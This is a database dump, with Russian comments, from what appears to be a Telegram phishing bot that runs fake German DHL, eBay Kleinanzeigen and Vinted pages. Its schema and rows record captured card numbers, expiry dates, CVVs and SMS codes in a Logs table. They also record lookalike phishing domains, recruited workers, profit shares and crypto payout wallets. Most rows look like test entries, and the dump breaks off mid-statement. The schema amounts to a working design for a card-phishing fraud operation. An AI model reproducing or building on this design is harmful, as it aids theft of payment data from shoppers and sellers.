-- phpMyAdmin SQL Dump
-- version 4.9.5deb2
-- https://www.phpmyadmin.net/
--
-- Хост: localhost
-- Время создания: Сен 12 2022 г., 01:09
-- Версия сервера: 8.0.30-0ubuntu0.20.04.2
-- Версия PHP: 7.4.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `bot`
--

-- --------------------------------------------------------

--
-- Структура таблицы `Ads`
--

CREATE TABLE `Ads` (
  `id` bigint NOT NULL,
  `userId` bigint NOT NULL,
  `adLink` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `title` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `address` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `name` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `photo` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `price` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `phone` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `serviceCode` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `version` tinyint NOT NULL DEFAULT '2',
  `balanceChecker` tinyint(1) NOT NULL DEFAULT '1',
  `writeId` bigint DEFAULT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Ads`
--

INSERT INTO `Ads` (`id`, `userId`, `adLink`, `title`, `address`, `name`, `photo`, `price`, `phone`, `serviceCode`, `version`, `balanceChecker`, `writeId`, `createdAt`) VALUES
(217371283, 1568427425, NULL, 'wqeqwe', 'Charleston, 1379 Alizadeh Coves', 'Rebecca Buchrucker', NULL, '2000 EUR', NULL, 'dhl_de', 2, 0, NULL, '2022-08-05 22:31:43');

-- --------------------------------------------------------

--
-- Структура таблицы `Bins`
--

CREATE TABLE `Bins` (
  `id` int NOT NULL,
  `bin` bigint DEFAULT NULL,
  `scheme` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `brand` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `country` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `currency` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `bank` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `Complaints`
--

CREATE TABLE `Complaints` (
  `id` bigint NOT NULL,
  `userId` bigint NOT NULL,
  `username` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `text` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `isSolved` tinyint(1) NOT NULL DEFAULT '0',
  `channelMessageId` bigint DEFAULT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Дамп данных таблицы `Complaints`
--

INSERT INTO `Complaints` (`id`, `userId`, `username`, `text`, `isSolved`, `channelMessageId`, `createdAt`) VALUES
(32, 911688408, 'mrkatz68', 'Bzbzbzbxbx', 1, 130, '2022-08-05 22:44:43'),
(33, 5589450531, 'callmescam1312', '💼 Кабинет', 0, 639, '2022-08-13 14:35:25');

-- --------------------------------------------------------

--
-- Структура таблицы `Countries`
--

CREATE TABLE `Countries` (
  `id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint NOT NULL DEFAULT '1',
  `withLk` tinyint(1) NOT NULL DEFAULT '0',
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Countries`
--

INSERT INTO `Countries` (`id`, `title`, `status`, `withLk`, `createdAt`) VALUES
('de', '🇩🇪 Германия', 1, 0, '2022-03-07 20:04:43');

-- --------------------------------------------------------

--
-- Структура таблицы `Currencies`
--

CREATE TABLE `Currencies` (
  `id` int NOT NULL,
  `code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `eur` decimal(36,2) DEFAULT NULL,
  `rub` decimal(36,2) DEFAULT NULL,
  `symbol` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Currencies`
--

INSERT INTO `Currencies` (`id`, `code`, `eur`, `rub`, `symbol`, `createdAt`) VALUES
(14, 'EUR', '1.00', '57.24', '€', '2022-06-26 04:32:58'),
(15, 'RON', '0.20', '11.57', 'lei', '2022-06-26 04:32:58'),
(16, 'CZK', '0.04', '2.31', 'Kč', '2022-06-26 04:32:58'),
(17, 'AUD', '0.66', '37.66', '$', '2022-06-26 04:32:58'),
(18, 'BYN', '0.40', '23.10', 'Br', '2022-07-15 04:11:53'),
(19, 'CHF', '1.02', '59.34', 'Fr', '2022-07-15 04:13:38'),
(20, 'AED', '0.27', '15.42', 'AED', '2022-07-25 14:02:39');

-- --------------------------------------------------------

--
-- Структура таблицы `Logs`
--

CREATE TABLE `Logs` (
  `id` int NOT NULL,
  `token` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `cardNumber` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `cardExpire` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `cardCvv` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `smsCode` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `otherInfo` json DEFAULT NULL,
  `adId` bigint NOT NULL,
  `writerId` bigint DEFAULT NULL,
  `status` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Logs`
--

INSERT INTO `Logs` (`id`, `token`, `cardNumber`, `cardExpire`, `cardCvv`, `smsCode`, `otherInfo`, `adId`, `writerId`, `status`, `createdAt`) VALUES
(320, '1659729313416.7136', '5221191100920460', '04/27', '111', NULL, '{\"cardBalance\": \"0.00\"}', 210163902, 911688408, 'sms', '2022-08-05 22:55:13'),
(321, '1659729875312.238', '5221191100920460', '05/25', '111', '390211', '{\"cardBalance\": \"0.00\"}', 182469066, 911688408, 'sms', '2022-08-05 23:04:35'),
(322, '1660227654631.5115', '4569330002971543', '08/29', '999', NULL, '{\"cardBalance\": \"0.00\"}', 176652004, 911688408, 'passwordBank', '2022-08-11 17:20:54');

-- --------------------------------------------------------

--
-- Структура таблицы `Mentors`
--

CREATE TABLE `Mentors` (
  `id` bigint NOT NULL,
  `userId` bigint NOT NULL,
  `username` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci DEFAULT NULL,
  `countries` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `text` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `ProDomains`
--

CREATE TABLE `ProDomains` (
  `id` bigint NOT NULL,
  `serviceCode` varchar(255) NOT NULL,
  `domain` text NOT NULL,
  `status` int NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Дамп данных таблицы `ProDomains`
--

INSERT INTO `ProDomains` (`id`, `serviceCode`, `domain`, `status`) VALUES
(4, 'ebay_de', 'leathermade.shop', 1);

-- --------------------------------------------------------

--
-- Структура таблицы `ProfitRequests`
--

CREATE TABLE `ProfitRequests` (
  `id` int NOT NULL,
  `userId` bigint DEFAULT NULL,
  `amount` decimal(36,2) NOT NULL,
  `serviceTitle` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `currency` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `requisites` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `screenshot` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint NOT NULL DEFAULT '0',
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `ProfitRequests`
--

INSERT INTO `ProfitRequests` (`id`, `userId`, `amount`, `serviceTitle`, `currency`, `requisites`, `screenshot`, `status`, `createdAt`) VALUES
(1, 1568427425, '100.00', '🇩🇪 DHL', 'EUR', 'SASAS2312321DSDasd', 'https://i.imgur.com/a6GQsmZ.jpg', 0, '2022-09-11 20:07:17'),
(4, 1568427425, '100.00', '🇩🇪 DHL', 'EUR', 'DSDS12312', 'https://i.imgur.com/a6GQsmZ.jpg', 2, '2022-09-11 20:30:49'),
(5, 1568427425, '150.00', '🇩🇪 DHL', 'EUR', 'DSDSD123', 'https://i.imgur.com/a6GQsmZ.jpg', 1, '2022-09-11 23:59:12'),
(6, 1568427425, '1500.00', '🇩🇪 Vinted', 'EUR', 'https://i.imgur.com/SVjeALN.jpg', 'https://i.imgur.com/SVjeALN.jpg', 1, '2022-09-12 00:01:24'),
(7, 1568427425, '140.00', '🇩🇪 DHL', 'EUR', '1500', 'https://i.imgur.com/SVjeALN.jpg', 1, '2022-09-12 00:02:46'),
(8, 1568427425, '123.00', '🇩🇪 DHL', 'EUR', 'DSDasd123', 'https://i.imgur.com/SVjeALN.jpg', 1, '2022-09-12 01:03:25'),
(9, 1568427425, '123.00', '🇩🇪 DHL', 'EUR', '💸 Мои профиты', '💸 Мои профиты', 1, '2022-09-12 01:06:48');

-- --------------------------------------------------------

--
-- Структура таблицы `Profits`
--

CREATE TABLE `Profits` (
  `id` bigint NOT NULL,
  `userId` bigint NOT NULL,
  `amount` decimal(36,2) NOT NULL,
  `convertedAmount` decimal(36,2) NOT NULL,
  `serviceTitle` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `currency` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint NOT NULL DEFAULT '0',
  `writerId` bigint NOT NULL,
  `channelMessageId` bigint DEFAULT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Profits`
--

INSERT INTO `Profits` (`id`, `userId`, `amount`, `convertedAmount`, `serviceTitle`, `currency`, `status`, `writerId`, `channelMessageId`, `createdAt`) VALUES
(56, 1568427425, '123.00', '7040.52', '🇩🇪 DHL', 'EUR', 0, 1568427425, 1647, '2022-09-12 01:05:59'),
(57, 1568427425, '123.00', '7040.52', '🇩🇪 DHL', 'EUR', 0, 1568427425, 1672, '2022-09-12 01:06:54');

-- --------------------------------------------------------

--
-- Структура таблицы `Requests`
--

CREATE TABLE `Requests` (
  `id` int NOT NULL,
  `userId` bigint DEFAULT NULL,
  `step1` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `step2` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `step3` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `status` tinyint NOT NULL DEFAULT '0',
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Requests`
--

INSERT INTO `Requests` (`id`, `userId`, `step1`, `step2`, `step3`, `status`, `createdAt`) VALUES
(366, 1568427425, 'wqewqe', 'qweqe', 'qwewqe', 1, '2022-08-05 22:25:35'),
(367, 911688408, 'Dodds', 'Dd', 'Ddd', 1, '2022-08-05 22:33:38'),
(368, 5589450531, 'от знакомого', 'ebay🇩🇪 много', '9', 1, '2022-08-06 09:24:38'),
(369, 5563360146, 'От знакомого', 'Есть опыт', '24 часа', 1, '2022-08-06 09:24:43'),
(370, 5438923533, 'Интернет', 'Да Германия Много', 'Много', 1, '2022-08-06 09:36:06'),
(371, 1870629576, 'Телеграмм', 'Форекс', '8 часов в день', 1, '2022-08-06 09:38:56'),
(372, 5473289467, 'Интернет', '-', '12-15 часов', 1, '2022-08-06 10:34:20'),
(373, 1541455462, '.', '+', '5/7', 1, '2022-08-06 14:42:25'),
(374, 5357997424, '1', '1', '1', 1, '2022-08-08 10:13:58'),
(375, 5324285788, 'Источник', 'На работе, 🇩🇪, 40', 'Достаточно', 1, '2022-08-08 10:16:51'),
(376, 5431003014, 'От знакомых', 'Нет опыта не имею. Страны Украина Чехия Германия. Продажи и работа на предприятии.', 'Все свободное время. Которое у меня остается после работы.', 1, '2022-08-08 10:16:53'),
(377, 1474453721, 'людии более', 'да', 'Олег сказал ,- всю жизнь', 1, '2022-08-11 17:05:08');

-- --------------------------------------------------------

--
-- Структура таблицы `sequelizemeta`
--

CREATE TABLE `sequelizemeta` (
  `name` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;

--
-- Дамп данных таблицы `sequelizemeta`
--

INSERT INTO `sequelizemeta` (`name`) VALUES
('20210713191139-create-user.js'),
('20210714070503-create-service.js'),
('20210714070744-create-profit.js'),
('20210714071949-create-settings.js'),
('20210714072712-create-ad.js'),
('20210714073242-create-request.js'),
('20210714073430-create-currency.js'),
('20210714073615-create-country.js'),
('20210714073645-create-writer.js'),
('20210714073731-create-support.js'),
('20210714073804-create-support-chat.js'),
('20210716202306-create-bin.js'),
('20210725072028-create-log.js');

-- --------------------------------------------------------

--
-- Структура таблицы `Services`
--

CREATE TABLE `Services` (
  `id` bigint NOT NULL,
  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `serviceDomain` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `domain` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `currencyCode` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `lang` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `translate` json DEFAULT NULL,
  `countryCode` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Services`
--

INSERT INTO `Services` (`id`, `title`, `serviceDomain`, `domain`, `status`, `currencyCode`, `lang`, `translate`, `countryCode`, `code`, `createdAt`) VALUES
(65, '🇩🇪 DHL', '', '5.45.76.112', 1, 'EUR', 'de', NULL, 'de', 'dhl_de', '2022-06-24 22:59:23'),
(67, '🇩🇪 Ebay', '', 'ebay-kleinanzeigen.sicherversand.de', 1, 'EUR', 'de', NULL, 'de', 'ebay_de', '2022-06-24 23:06:30'),
(76, '🇩🇪 Vinted', '', '5.45.76.112', 1, 'EUR', 'de', NULL, 'de', 'vinted_de', '2022-07-15 04:10:37');

-- --------------------------------------------------------

--
-- Структура таблицы `Settings`
--

CREATE TABLE `Settings` (
  `id` int NOT NULL,
  `loggingGroupId` bigint DEFAULT NULL,
  `logsGroupId` bigint DEFAULT NULL,
  `allGroupId` bigint DEFAULT NULL,
  `requestsGroupId` bigint DEFAULT NULL,
  `payoutsChannelId` bigint DEFAULT NULL,
  `requestsEnabled` tinyint(1) NOT NULL DEFAULT '0',
  `allLogsEnabled` tinyint(1) DEFAULT '1',
  `allHelloMsgEnabled` tinyint(1) DEFAULT '1',
  `allGroupLink` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `payoutsChannelLink` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `payoutPercent` decimal(36,2) NOT NULL DEFAULT '70.00',
  `paypal` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `iban` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Settings`
--

INSERT INTO `Settings` (`id`, `loggingGroupId`, `logsGroupId`, `allGroupId`, `requestsGroupId`, `payoutsChannelId`, `requestsEnabled`, `allLogsEnabled`, `allHelloMsgEnabled`, `allGroupLink`, `payoutsChannelLink`, `payoutPercent`, `paypal`, `iban`, `createdAt`) VALUES
(1, -729710707, -741761417, -703745129, -787228309, -623249370, 1, 1, 1, 'https://t.me/+hT2zGOJniwgxYzRi', 'https://t.me/+FDmUlVx4pyxlNmRi', '80.00', 'DSdsd1231DSdas', 'DSDSD123908219038ew90dsx90x', '2021-10-21 09:00:01');

-- --------------------------------------------------------

--
-- Структура таблицы `SupportChats`
--

CREATE TABLE `SupportChats` (
  `id` int NOT NULL,
  `supportId` bigint DEFAULT NULL,
  `messageFrom` tinyint DEFAULT NULL,
  `message` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `readed` tinyint(1) NOT NULL DEFAULT '0',
  `messageId` int DEFAULT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `SupportChats`
--

INSERT INTO `SupportChats` (`id`, `supportId`, `messageFrom`, `message`, `readed`, `messageId`, `createdAt`) VALUES
(957, 1173, 0, 'ef23f32dkd90843jhADh983d23jd9', 1, 70, '2022-08-05 22:31:55'),
(958, 1173, 0, 'weqqwewq', 1, 73, '2022-08-05 22:32:00'),
(959, 1174, 0, 'ef23f32dkd90843jhADh983d23jd9', 0, 155, '2022-08-05 22:53:13'),
(960, 1174, 0, '💼 Кабинет', 0, 161, '2022-08-05 22:53:34'),
(961, 1178, 0, 'Hdhdbd', 1, 255, '2022-08-05 23:04:53'),
(962, 1180, 1, 'vdfvdfgvfg', 0, NULL, '2022-08-11 17:24:05'),
(963, 1180, 0, 'Ты пёс', 1, 625, '2022-08-11 17:24:15'),
(964, 1183, 0, 'ef23f32dkd90843jhADh983d23jd9', 1, 959, '2022-09-03 14:11:25'),
(965, 1183, 0, 'хай', 1, 962, '2022-09-03 14:11:31');

-- --------------------------------------------------------

--
-- Структура таблицы `Supports`
--

CREATE TABLE `Supports` (
  `id` int NOT NULL,
  `adId` bigint DEFAULT NULL,
  `token` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Supports`
--

INSERT INTO `Supports` (`id`, `adId`, `token`, `status`, `createdAt`) VALUES
(1173, 217371283, '1659727909194.5544', NULL, '2022-08-05 22:31:49'),
(1174, 228857731, '1659728839092.5437', NULL, '2022-08-05 22:47:19'),
(1175, 210163902, '1659729263067.078', NULL, '2022-08-05 22:54:23'),
(1176, 256785419, '1659729643919.7302', NULL, '2022-08-05 23:00:43'),
(1177, 209656028, '1659729700616.7585', NULL, '2022-08-05 23:01:40'),
(1178, 182469066, '1659729838372.8623', NULL, '2022-08-05 23:03:58'),
(1179, 182469066, '1659806246272.7852', NULL, '2022-08-06 20:17:26'),
(1180, 176652004, '1660227553456.7666', NULL, '2022-08-11 17:19:13'),
(1181, 178309711, '1661160146851.181', NULL, '2022-08-22 12:22:26'),
(1182, 241236304, '1661160882282.432', NULL, '2022-08-22 12:34:42'),
(1183, 217371283, '1662203472696.3035', NULL, '2022-09-03 14:11:12');

-- --------------------------------------------------------

--
-- Структура таблицы `SupportTemplates`
--

CREATE TABLE `SupportTemplates` (
  `id` bigint NOT NULL,
  `userID` bigint NOT NULL,
  `title` text NOT NULL,
  `message` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `countryCode` varchar(255) NOT NULL,
  `status` int NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `SupportUsers`
--

CREATE TABLE `SupportUsers` (
  `id` bigint NOT NULL,
  `userId` bigint NOT NULL,
  `username` varchar(255) NOT NULL,
  `text` text NOT NULL,
  `status` int NOT NULL DEFAULT '1',
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `Users`
--

CREATE TABLE `Users` (
  `id` bigint NOT NULL,
  `username` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint NOT NULL DEFAULT '0',
  `banned` tinyint(1) NOT NULL DEFAULT '0',
  `hideNick` tinyint(1) NOT NULL DEFAULT '0',
  `percent` decimal(36,2) DEFAULT NULL,
  `percentType` tinyint DEFAULT NULL,
  `USDTWallet` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `referral` bigint DEFAULT NULL,
  `myMentor` bigint DEFAULT NULL,
  `mySupport` bigint DEFAULT NULL,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Users`
--

INSERT INTO `Users` (`id`, `username`, `status`, `banned`, `hideNick`, `percent`, `percentType`, `USDTWallet`, `referral`, `myMentor`, `mySupport`, `createdAt`) VALUES
(516877062, 'Castor', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-06 09:38:11'),
(645937408, 'NinoB148', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-15 17:20:39'),
(911688408, 'mrkatz69', 1, 0, 0, NULL, NULL, 'TAGLZWHoqWBEbpEyfWcbPcmrRg1m55YL7H', NULL, NULL, NULL, '2022-08-05 22:25:53'),
(997533928, 'gpsjj1221tj', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-14 10:58:53'),
(1474453721, 'ba3yka2_0', 0, 0, 0, NULL, NULL, 'TJAwhEAHLPRcvrytcL6wHofsAusFiXy6zn', NULL, NULL, NULL, '2022-08-11 17:04:00'),
(1541455462, 'Sexobar228', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-06 14:41:59'),
(1568427425, 'php_rasmus', 1, 0, 0, NULL, NULL, 'TUvdis4pbKRY4YHt393K8fkake6HZBxYPU', NULL, NULL, NULL, '2022-08-05 22:25:29'),
(1870629576, 'on_formatus', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-06 09:38:02'),
(5324285788, 'ronin77822', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-08 10:12:43'),
(5357997424, 'mazatupa', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-08 10:12:20'),
(5384942398, 'lovebabuh13', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-06 10:51:52'),
(5431003014, '5431003014', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-08 10:13:08'),
(5438923533, '5438923533', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-06 09:35:34'),
(5473289467, 'playerhNTR1337', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-06 10:33:52'),
(5563360146, 'diss1m', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-06 09:23:20'),
(5578171603, '5578171603', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-13 08:08:48'),
(5589450531, 'callmescam1312', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-06 09:22:43'),
(5597032859, 'b1gbou', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, '2022-08-08 10:34:17');

-- --------------------------------------------------------

--
-- Структура таблицы `Writers`
--

CREATE TABLE `Writers` (
  `id` int NOT NULL,
  `countryCode` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `username` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `createdAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updatedAt` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `Writers`
--

INSERT INTO `Writers` (`id`, `countryCode`, `username`, `createdAt`) VALUES
(33, 'de', 'ba3yka2_0', '2022-08-11 17:11:32');

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `Ads`
--
ALTER TABLE `Ads`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Bins`
--
ALTER TABLE `Bins`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Complaints`
--
ALTER TABLE `Complaints`
